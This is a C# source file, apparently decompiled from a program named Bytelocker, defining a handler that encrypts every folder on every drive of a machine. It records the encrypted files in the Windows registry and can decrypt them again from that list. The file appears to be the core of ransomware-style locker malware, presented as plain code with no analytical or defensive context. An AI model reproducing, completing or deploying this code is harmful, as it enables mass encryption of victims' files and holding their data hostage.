using System;
using System.Collections.Generic;
using System.IO;
using Bytelocker.Settings;
using Bytelocker.UI;

namespace Bytelocker.CryptoManager;

internal class CryptoManagerMainHandler
{
	private readonly RegistryManager rm;

	public CryptoManagerMainHandler()
	{
		rm = new RegistryManager();
		rm.CreateMainKey();
	}

	public void DecryptAll()
	{
		FileManager fileManager = new FileManager();
		List<string> list = rm.ReadAllValues(RegistryManager.FILES_KEY_NAME);
		if (list[0] == "null")
		{
			return;
		}
		foreach (string item in list)
		{
			string file_path = (MainWindow.current_decrypt_file = item);
			fileManager.ChooseFile(file_path);
			fileManager.SetupFileEncrypter();
			while (true)
			{
				if (!fileManager.DecryptFile())
				{
					if (!ErrorDecryptMessageBox.showMessageBoxDecryptError(file_path))
					{
						fileManager.removeRegistryItem();
						break;
					}
					continue;
				}
				fileManager.DeleteFile();
				fileManager.RenameTmpFileToOrig();
				break;
			}
		}
	}

	public void EncryptAll()
	{
		DirManager dirManager = new DirManager();
		DriveInfo[] drives = DriveInfo.GetDrives();
		for (int i = 0; i < drives.Length; i++)
		{
			foreach (string item in DirManager.GetFoldersRecursive(drives[i].ToString()))
			{
				dirManager.ChooseDir(item);
				dirManager.EncryptDir();
			}
		}
	}

	public void EncryptFolder(string folder_path)
	{
		DirManager dirManager = new DirManager();
		foreach (string item in DirManager.GetFoldersRecursive(folder_path))
		{
			dirManager.ChooseDir(item);
			dirManager.EncryptDir();
		}
	}

	public List<string> FilesEncryptedList()
	{
		try
		{
			return new List<string>(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME));
		}
		catch (Exception)
		{
			return new List<string>();
		}
	}
}
